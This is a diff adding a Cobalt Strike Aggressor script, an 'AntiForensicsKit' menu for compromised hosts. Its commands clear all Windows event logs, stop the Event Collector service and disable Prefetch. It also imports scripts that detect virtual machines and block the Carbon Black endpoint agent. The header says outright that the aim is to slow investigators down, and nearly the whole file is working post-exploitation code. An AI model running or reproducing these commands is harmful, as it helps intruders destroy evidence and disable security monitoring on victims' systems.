@@ -1,0 +1,67 @@
+# Actions in this kit center around antiforensics. If it slows an investigator down, it likely belongs in this kit. We all know antiforensics is best forensics
+# @Und3rf10w
+
+popup beacon_bottom {
+	menu "AntiForensicsKit" {
+		item "Clear System Event Logs (psh)"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+				bpowershell($1, "gcim -CimSession $CimSession -ClassName Win32_NTEventlogFile | icim -MethodName ClearEventLog");
+			}
+		}
+		item "Stop Windows Event Collector svc"{
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "sc stop wecsvc");
+				bshell($1, "sc stop wecsvc");
+			}
+		}
+		item "Check VM" {
+			local('$bid');
+			foreach $bid ($1){
+				binput($1, "powershell-import Check-VM.ps1");
+				bpowershell_import($1, script_resource("AntiForensicsKit/scripts/Check-VM.ps1"));
+				binput($1, "powershell Check-VM");
+				bpowershell($1, "Check-VM");
+			}
+		}
+		menu "Prefetch Management" {
+			item "Disable Prefetch" {
+				local('$bid');
+				foreach $bid ($1) {
+					bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "0"');
+					bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "0"');
+					#bshell($1,'net stop eventlog /f');
+				}
+			}
+			item "Enable Prefetch" {
+					local('$bid');
+					foreach $bid ($1) {
+						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnablePrefetcher" /t REG_DWORD /F /D "3"');
+						bshell($bid,'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session\Memory Management\PrefetchParameters" /V "EnableSuperfetcher" /t REG_DWORD /F /D "1"');
+				}
+			}
+		}
+		menu "Carbon Black" {
+			item "Block Carbon Black (<= 7.2.3P2)"{
+				local('$bid');
+				foreach $bid ($1) {
+					openOrActivate($bid);
+					bpowershell_import($bid, script_resource("AntiForensicsKit/scripts/Block-CarbonBlack.ps1"));
+					binput($bid, "powershell Block-CarbonBlack");
+					bpowershell($bid, "Block-CarbonBlack");
+				}
+			}
+			item "Restore Carbon Black"{
+				local('$bid');
+				foreach $bid ($1) {
+					openOrActivate($bid);
+					bpowershell_import($bid, script_resource("AntiForensicsKit/scripts/Block-CarbonBlack.ps1"));
+					binput($bid, "powershell Restore-CarbonBlack");
+					bpowershell($bid, "Restore-CarbonBlack");
+				}
+			}
+		}
+	}
+}
